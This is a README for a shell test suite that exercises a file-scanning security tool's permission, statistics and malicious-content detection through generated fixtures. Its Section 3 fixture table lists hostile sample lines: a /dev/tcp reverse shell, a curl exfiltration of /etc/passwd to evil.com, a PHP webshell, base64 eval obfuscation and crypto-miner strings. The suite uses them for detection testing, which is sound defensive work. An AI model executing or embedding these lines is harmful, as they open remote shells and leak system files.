# 🧪 Filescan Suite Test Suite

> `filescan-test.sh` — comprehensive self-contained test suite for the Filescan Suite scripts.

---

## Overview

`filescan-test.sh` validates the correctness of all Filescan Suite scripts through functional tests with generated fixtures. Like the SBOM Toolkit test suite, it is self-contained: all fixture directories and files are created at startup — no pre-existing packages are required.

The suite tests argument validation, detection accuracy (both true positives and true negatives), risk scoring, fix mode behaviour, JSON output structure, and output file permissions. Section 5 covers integration behaviour when all three scripts run together via `run-filescans.sh`.

---

## Running the Suite

```bash
# Run all tests
bash filescan-test.sh

# Dry run — verify tools and scripts are available
bash filescan-test.sh --dry-run

# Run specific sections only
bash filescan-test.sh --only 1        # permission-check only
bash filescan-test.sh --only 2,3      # file-stats and deep-filescan

# Verbose — print every assertion result
bash filescan-test.sh --verbose
```

Exit code: `0` = all tests passed · `1` = one or more failures · `2` = setup error

---

## Test Sections

### Section 1 — `permission-check.sh`

This is the most extensive section, covering the full range of permission findings and fix-mode behaviour.

**Fixtures:** A directory tree with specifically crafted permissions: world-writable file, world-writable directory without sticky bit, SUID binary (created with `chmod u+s`), external symlink (pointing outside the fixture directory), internal symlink, dangling symlink, sensitive `.env` file readable by others, data files with unnecessary execute bits, and a clean baseline set with correct permissions.

| Test group | What is verified |
|---|---|
| Arg errors | No args → exit 2; non-existent directory → exit 2 |
| Clean directory | Exit 0; `total_issues == 0`; `risk_contribution == 0` |
| World-writable file | Detected; `type == "world-writable_file"`; exit 1 |
| World-writable dir | Detected; `type == "world-writable_dir"` |
| Missing sticky bit | World-writable dir without `+t` → `type == "missing_sticky_bit"` |
| SUID/SGID detection | SUID binary detected; `severity == "CRITICAL"` |
| External symlink | Symlink pointing outside fixture dir → detected |
| Sensitive file | `.env` with `o+r` → `type == "sensitive_exposure"` |
| Unnecessary exec | `.png` with execute bit → `type == "unnecessary_exec"` |
| Risk scoring | World-writable file contributes ≥ 10 to `risk_contribution` |
| `--fix` removes world-writable | After fix, re-scan shows `writable_files == 0` |
| `--fix` adds sticky bit | After fix, re-scan shows `missing_sticky_bit == 0` |
| `--fix` strips exec from data file | `.png` execute bit removed after fix |
| `--fix` does not auto-fix SUID | SUID finding remains after fix run |
| File write and permissions | Output at `664`; no absolute paths in JSON |
| JSON structure | All required summary fields present; `risk_detail` has `critical_floor` and `other_risk` |

---

### Section 2 — `file-stats.sh`

**Fixtures:** A directory with known composition: specific counts of PHP, JS, CSS, image, binary, and archive files; `.gitignore` and `README.md` present; `CHANGELOG.md` and `LICENSE` absent; one hidden file; two minified JS files (single-line, >500 chars).

| Test group | What is verified |
|---|---|
| Arg errors | No args → exit 2; non-existent directory → exit 2 |
| Category counts | `categories` array contains `code` and `web` entries with correct file counts |
| Total file count | `totals.files` matches expected count |
| Minified file detection | `totals.minified_files == 2` |
| Hidden file detection | `totals.hidden_files == 1` |
| Best practices — found | `readme` present → `present == true` in best_practices items |
| Best practices — missing | `changelog` absent → `present == false` |
| No risk contribution | `file_statistics` does not contain `risk_contribution` field |
| `--verbose` extension breakdown | Verbose output contains per-extension data |
| File write and permissions | Output at `664` |
| Informational only | Exit 0 regardless of best-practice findings |

---

### Section 3 — `deep-filescan.sh`

This section tests both detection (true positives) and non-detection (true negatives) for each threat category. It also tests MIME integrity checks and the size limit behaviour.

**Fixtures created per threat category:**

| Fixture file | Contains |
|---|---|
| `shell_reverse.php` | `bash -i >& /dev/tcp/10.0.0.1/4444` |
| `miner.js` | `coinhive` and `stratum+tcp://` references |
| `obfus.php` | `eval(base64_decode("..."))` |
| `exfil.php` | `curl --data @/etc/passwd http://evil.com` |
| `webshell.php` | `system($_GET['cmd'])` |
| `clean.php` | Legitimate PHP code — no patterns |
| `fake_image.php` | PHP file named `.jpg` (MIME mismatch fixture) |
| `large_file.php` | 11 MB file — should be skipped by size limit |

| Test group | What is verified |
|---|---|
| Arg errors | No args → exit 2 |
| Reverse shell detection | `patterns.reverse_shells >= 1`; severity CRITICAL |
| Crypto miner detection | `patterns.crypto_miners >= 1`; severity CRITICAL |
| Obfuscation detection | `patterns.obfuscation >= 1`; severity HIGH |
| Data exfiltration detection | `patterns.data_exfiltration >= 1`; severity HIGH |
| PHP webshell detection | `patterns.webshell >= 1`; severity MEDIUM |
| Clean file — no false positive | Clean PHP with no patterns → `total_issues == 0` on clean-only directory |
| MIME mismatch detection | `.jpg` containing PHP → MIME mismatch finding |
| Size limit | 11 MB file → `files_size_skipped == 1` |
| `--no-size-limit` | 11 MB file is now scanned; `files_size_skipped == 0` |
| Exit codes | Critical finding → exit 1; clean directory → exit 0 |
| Risk contribution | At least one CRITICAL finding → `risk_contribution >= 500` |
| Single file input | Script accepts a file path (not directory) as input |
| File write and permissions | Output at `664` |

---

### Section 4 — `run-filescans.sh`

**Fixtures:** A combined directory with both permission issues (world-writable file) and a content pattern (base64 eval) present simultaneously.

| Test group | What is verified |
|---|---|
| Arg errors | No args → exit 2 |
| Basic run (no `--deep`) | `scans.file_statistics` present; `scans.content_scan` absent |
| `--deep` run | `scans.content_scan` present and non-empty |
| `--fix` pass-through | Permission fix applied; re-scan shows reduced `risk_contribution` |
| Merged risk summary | `risk_summary.total` equals sum of component risks |
| `scan_suite` field | `scan_suite == "filescan"` |
| Output file | `<clean-name>.filescan.json` created at `664` |
| Silent JSON | `-sj` produces parseable JSON with no log output |

---

### Section 5 — Integration

Tests the interaction between all three scripts running through `run-filescans.sh --deep`.

**Fixtures:** A realistic plugin-like directory with: correct PHP code, a `README.md`, world-writable `uploads/` directory, one file with an unnecessary execute bit, and one `.jpg` file that is actually a PHP file (MIME mismatch).

| Test group | What is verified |
|---|---|
| All three sections present | `file_statistics`, `permission_audit`, and `content_scan` all present in merged output |
| Permission finding in merged output | `permission_audit.summary.total_issues >= 1` |
| MIME finding in merged output | `content_scan.summary.integrity.mime_mismatches.total >= 1` |
| Risk summary aggregation | `risk_summary.total` equals `permissions + content` |
| Run is idempotent | Running twice on the same directory produces the same output |
| No absolute paths in any section | `assert_no_abspath` passes on merged output |

---

## Fixture Design Notes

### Permission fixtures

Creating permission-based fixtures requires careful handling of `chmod` and the `mktemp` environment. SUID bits may not be settable in all CI environments (e.g., Docker containers running as root treat SUID differently). The suite detects this and skips SUID tests gracefully with `[SKIP]` rather than `[FAIL]`.

### Pattern fixtures

The pattern test files contain *representative matches* — not complete working malware. The patterns are sufficient to trigger `grep` matches but are not functional exploit code. They are created as plain text files with no executable bit.

### MIME mismatch fixtures

A PHP file named `.jpg` is the primary MIME mismatch test. The `file` command must report `text/x-php` or similar for this fixture. On systems where `file` reports differently (e.g., `text/plain` for a PHP file without a shebang), the MIME mismatch test is skipped with a note.

---

## Expected Output

```
=== Package Profiler — Filescan Suite Test Suite ===
Running 5 sections, N assertions

──── 1. permission-check.sh ──────────────────────────
  [arg errors]
  PASS  no args → exit 2
  PASS  non-existent directory → exit 2
  [clean directory]
  PASS  clean: exit 0
  PASS  clean: total_issues == 0
  ...

══════════════════════════════════════════════════════
  Results: N passed, 0 failed, 0 skipped (N total)
══════════════════════════════════════════════════════
```

---

## Known Limitations

- SUID detection tests may be skipped in container environments where `chmod u+s` has no effect for the current user.
- MIME mismatch tests depend on the behaviour of the `file` command, which varies between operating systems and `libmagic` versions. Tests are skipped rather than failed when `file` does not produce the expected MIME type for a fixture.
- The `deep-filescan.sh` pattern tests confirm that each pattern category is detected in its own isolated file. They do not test the interaction between multiple pattern categories in a single scan run — this is covered indirectly by the integration section.
- Large-file size limit tests create an 11 MB file on disk. Ensure the test environment has at least 50 MB of free space in the temporary directory.

---

<sub>Scripts licensed MIT · Documentation [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) · © Package Profiler Contributors</sub>
